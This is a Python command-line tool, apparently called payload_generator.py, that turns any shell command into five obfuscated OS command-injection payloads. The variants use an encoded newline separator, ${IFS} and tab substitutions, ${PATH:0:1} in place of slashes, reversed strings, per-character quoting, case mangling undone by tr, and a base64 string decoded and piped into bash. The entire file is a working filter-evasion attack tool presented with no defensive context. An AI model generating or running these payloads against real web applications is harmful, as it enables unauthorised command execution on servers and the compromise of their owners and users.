import shlex
import sys
import base64

def escape_path(path: str) -> str:
    """Replace '/' in path with ${PATH:0:1}."""
    parts = path.split('/')
    rebuilt = parts[0]
    for part in parts[1:]:
        rebuilt += "${PATH:0:1}" + part
    return rebuilt


def variant1(tokens):
    """Variant 1: direct command (brace-expansion if flags exist)."""
    cmd = tokens[0]
    flags = ''.join(tok for tok in tokens[1:] if tok.startswith('-'))
    args = [tok for tok in tokens[1:] if not tok.startswith('-')]

    payload = "${LS_COLORS:10:1}%0a"
    if flags:
        payload += f"{{{cmd},{flags}}}"
    else:
        payload += cmd

    sep = "${IFS}"
    for arg in args:
        payload += sep + escape_path(arg)
    return payload


def variant2(tokens):
    """Variant 2: rev hack for each non-path token."""
    payload = "${LS_COLORS:10:1}%0a"
    sep = "${IFS}"
    for tok in tokens:
        if tok.startswith('/'):
            payload += sep + escape_path(tok)
        else:
            rev = tok[::-1]
            prefix = sep if not payload.endswith("%0a") else ""
            payload += prefix + f"$(rev<<<'{rev}')"
    return payload


def variant3(tokens):
    """Variant Linux/Windows: split each token into chars quoted individually."""
    payload = "${LS_COLORS:10:1}%0a"
    sep = "${IFS}"
    for tok in tokens:
        payload += sep
        obf = "".join(f"'{c}'" for c in tok)
        payload += obf
    return payload


def variant4(tokens):
    """Variant Case Manipulation: use tr to map mixed-case input back to lowercase."""
    cmd_str = ' '.join(tokens)
    mixed = ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(cmd_str))
    payload = '%0a$(tr%09"[A-Z]"%09"[a-z]"<<<"' + mixed + '")'
    return payload


def variant5(tokens):
    """Variant Base64: encode command in base64 and decode in bash."""
    cmd_str = ' '.join(tokens)
    encoded = base64.b64encode(cmd_str.encode()).decode()
    payload = '%0abash<<<$(base64%09-d<<<' + encoded + ')'
    return payload


def generate_variants(command: str):
    """Generate all payload variants from a raw command string."""
    tokens = shlex.split(command)
    if not tokens:
        return "", "", "", "", ""
    return (
        variant1(tokens),
        variant2(tokens),
        variant3(tokens),
        variant4(tokens),
        variant5(tokens),
    )


def _extract_command(args):
    """Extract command between START- and -STOP markers if present, else whole args."""
    if 'START-' in args and '-STOP' in args:
        start = args.index('START-') + 1
        stop = args.index('-STOP')
        cmd_list = args[start:stop]
    else:
        cmd_list = args
    return ' '.join(cmd_list)


if __name__ == "__main__":
    raw_args = sys.argv[1:]
    if not raw_args:
        print("Usage: python payload_generator.py START- <shell command> -STOP")
        sys.exit(1)
    # Extract the core command string
    cmd_str = _extract_command(raw_args)
    # Generate payload variants
    v1, v2, v3, v4, v5 = generate_variants(cmd_str)
    # Output all variants
    print(f"Variant 1: {v1}")
    print(f"Variant 2: {v2}")
    print(f"Variant Linux/Windows: {v3}")
    print(f"Variant Case Manipulation: {v4}")
    print(f"Variant Base64: {v5}")
